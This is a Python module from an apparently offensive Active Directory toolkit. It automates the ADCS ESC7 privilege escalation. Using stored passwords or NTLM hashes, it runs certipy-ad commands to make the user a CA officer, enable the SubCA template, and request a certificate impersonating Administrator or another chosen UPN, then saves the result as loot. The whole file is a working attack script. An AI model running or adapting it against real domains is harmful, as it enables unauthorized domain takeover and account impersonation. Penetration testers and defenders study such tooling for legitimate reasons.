# modules/adcs/esc7.py

from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow


def abuse_esc7(session):
    print(blue("[*] ESC7: Abusing ManageCA / ManageCertificates rights..."))
    try:
        cas = session.adcs_metadata.get("cas", [])
        if not cas:
            print(red("[-] No CA metadata found. Run 'adcs enum' first."))
            return

        ca_name = cas[0].get("name", "")
        if not ca_name:
            print(red("[-] CA name could not be determined from metadata."))
            return

        print(yellow(f"[*] Target CA: {ca_name}"))

        if session.hash:
            auth = f"-u {session.username}@{session.domain} -hashes :{session.hash}"
        elif session.password:
            auth = f"-u {session.username}@{session.domain} -p '{session.password}'"
        else:
            print(red("[-] No credentials in session."))
            return

        # Step 1: Add current user as Certificate Officer
        print(blue(f"[*] Step 1 - Adding '{session.username}' as CA Officer..."))
        cmd1 = (
            f"certipy-ad ca {auth} -dc-ip {session.dc_ip} "
            f"-ca '{ca_name}' -add-officer {session.username}"
        )
        out, err = run_command(cmd1)
        print(out or err)

        # Step 2: Enable the SubCA template
        print(blue("[*] Step 2 - Enabling SubCA template..."))
        cmd2 = (
            f"certipy-ad ca {auth} -dc-ip {session.dc_ip} "
            f"-ca '{ca_name}' -enable-template SubCA"
        )
        out, err = run_command(cmd2)
        print(out or err)

        # Step 3: Request a SubCA certificate for a privileged UPN
        upn = input(
            f"[?] UPN to impersonate [default: Administrator@{session.domain}]: "
        ).strip() or f"Administrator@{session.domain}"

        print(blue(f"[*] Step 3 - Requesting SubCA certificate for '{upn}'..."))
        cmd3 = (
            f"certipy-ad req {auth} -dc-ip {session.dc_ip} "
            f"-ca '{ca_name}' -template SubCA -upn {upn}"
        )
        out, err = run_command(cmd3)
        result = out or err
        print(result)
        if result:
            save_loot("esc7_output.txt", result)

    except Exception as e:
        print(red(f"[!] ESC7 failed: {e}"))
